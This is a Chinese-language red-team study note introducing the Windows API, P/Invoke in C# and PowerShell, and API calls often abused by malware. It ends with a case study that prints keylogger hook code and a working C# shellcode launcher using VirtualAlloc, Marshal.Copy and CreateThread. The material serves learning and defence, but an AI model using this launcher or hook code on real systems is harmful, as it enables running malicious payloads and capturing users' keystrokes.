# Windows API 简介

其实很早之前我就完成了红队路径，只是没写笔记，现在开始复习一下红队，根据大佬的建议，我们直接只看 .NET C#相关的利用

了解如何与 win32 API 交互并了解其广泛的用例

Windows API 提供本机功能来与 Windows 操作系统的关键组件进行交互。该 API 被许多人广泛使用，包括红队成员、威胁参与者、蓝队成员、软件开发人员和解决方案提供商。

该API可以与Windows系统无缝集成，提供其一系列用例。您可能会看到Win32 API被用于攻击性工具和恶意软件开发，EDR（Endpoint Detection&Response）工程以及通用软件应用程序。

---

## Windows API 的组件

Win32 API（通常称为 Windows API）具有多个依赖组件，用于定义 API 的结构和组织。

让我们通过自上而下的方法分解 Win32 API。我们假设 API 是顶层，构成特定调用的参数是底层。在下表中，我们将在较高层次上描述自上而下的结构，并在后面更详细地介绍。

![在这里插入图片描述](https://img-blog.csdnimg.cn/e6383fe4223341ccb5be7e307ed46acd.png)

## OS Libraries

Win32 库的每个 API 调用都驻留在内存中，并且需要一个指向内存地址的指针。由于 ASLR（Address Space Layout Randomization）实现，获取指向这些函数的指针的过程被模糊了;每种语言或包都有一个独特的过程来克服 ASLR。在整个房间中，我们将讨论两个最流行的实现：[P/Invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) 和 [Windows 头文件](https://docs.microsoft.com/en-us/windows/win32/winprog/using-the-windows-headers)

### Windows 头文件

微软已经发布了Windows头文件，也称为Windows加载程序，作为与ASLR实现相关的问题的直接解决方案。将概念保持在较高级别，在运行时，加载程序将确定正在进行哪些调用，并创建一个 thunk 表来获取函数地址或指针。

一旦windows.h文件包含在非托管程序的顶部;可以调用任何 Win32 函数

### P/Invoke

**一种允许您从托管代码访问非托管库中的结构、回调和函数的技术**

P/invoke 提供的工具用于处理从托管代码调用非托管函数的整个过程，换句话说，调用 Win32 API。P/invoke 将通过导入包含非托管函数或 Win32 API 调用的所需 DLL 来启动。

微软官方示例：

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
    // Import user32.dll (containing the function we need) and define
    // the method corresponding to the native function.
    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    public static void Main(string[] args)
    {
        // Invoke the function as a regular managed method.
        MessageBox(IntPtr.Zero, "Command-line message box", "Attention!", 0);
    }
}
```

## API 调用结构

API 调用是 Win32 库的第二个主要组件。这些调用提供了可扩展性和灵活性，可用于满足大量用例。大多数 Win32 API 调用在 [Windows API 文档](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)和 pinvoke.net 下都有很好的记录。

我们将介绍 API 调用的命名方案和输入/输出参数。

可以通过修改命名方案和附加表示字符来扩展 API 调用功能。下表列出了微软支持其命名方案的字符。

![在这里插入图片描述](https://img-blog.csdnimg.cn/04d38ab5927d4394a250e003f9979b91.png)

例如VirtualAllocEx和VirtualAlloc，VirtualAllocEx额外提供了在另一个进程的地址空间中分配内存

![在这里插入图片描述](https://img-blog.csdnimg.cn/51e7065be6a44d9db989f04d1b5b473b.png)

## .NET 和 Powershell的API实现

### C#

P/Invoke 允许我们导入 DLL 并将指针分配给 API 调用。

为了理解 P/Invoke 是如何实现的，让我们通过下面的示例直接进入它，并在后面讨论各个组件。

示例：

GetComputerNameA:

```cpp
BOOL GetComputerNameA(
  [out]     LPSTR   lpBuffer,
  [in, out] LPDWORD nSize
);
```

C#：

```csharp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}
```

第二行通过DllImport特性来导入kernel32 dll，第三行通过extern关键字定义导入的函数。根据微软官方的说明，函数签名必须与其一致

### Powershell

让我们看看如何调整相同的语法以在 PowerShell 中工作。

得益于.net是一家，他们有着类似的语法来实现

```powershell
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
```

但 PowerShell 需要进一步执行一个步骤才能初始化它们。我们必须在方法定义中为每个 Win32 DLL 的指针创建一个新类型。函数 Add-Type 将临时文件放在 /temp 目录并编译所需的函数 csc.exe.下面是正在使用的函数的示例。

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```

现在，我们可以将所需的 API 调用与以下语法一起使用。

```powershell
[Win32.Kernel32]::<Imported Call>()
```

## 常见的 被滥用的API调用

Win32 库中的多个 API 调用很容易被恶意活动利用。下表列出了样本集合中按频率组织的最常被滥用的 API

![在这里插入图片描述](https://img-blog.csdnimg.cn/a3b60f520067401b93239fee04357000.png)

## 恶意软件案例研究

在此任务中，我们将分解 C# 键盘记录器和外壳代码启动器。

### 键盘记录器

下面是恶意软件示例源代码的 p/invoke 定义的片段。

```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/338a8f1cc5ce4f909b7ac831f910e53f.png)

为了保持本案例研究的道德完整性，我们将不介绍示例如何收集每个击键。我们将分析示例如何在当前进程上设置钩子。下面是恶意软件示例源代码的挂钩部分的片段。

```csharp
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```

### ShellCode启动器

要开始分析 shellcode 启动器，我们需要再次收集它正在实现哪些 API 调用。此过程应与前面的案例研究相同。下面是恶意软件示例源代码的 p/invoke 定义的片段。

```csharp
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/fac47fa61742447da5ac6458a0c1fc01.png)

```csharp
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```

这里首先使用VirtualAlloc为shellcode分配一块虚拟内存空间，然后通过Marshal.Copy函数将shellcode写入该内存，然后使用CreateThread创建线程并执行，WaitForSingleObject等待线程完成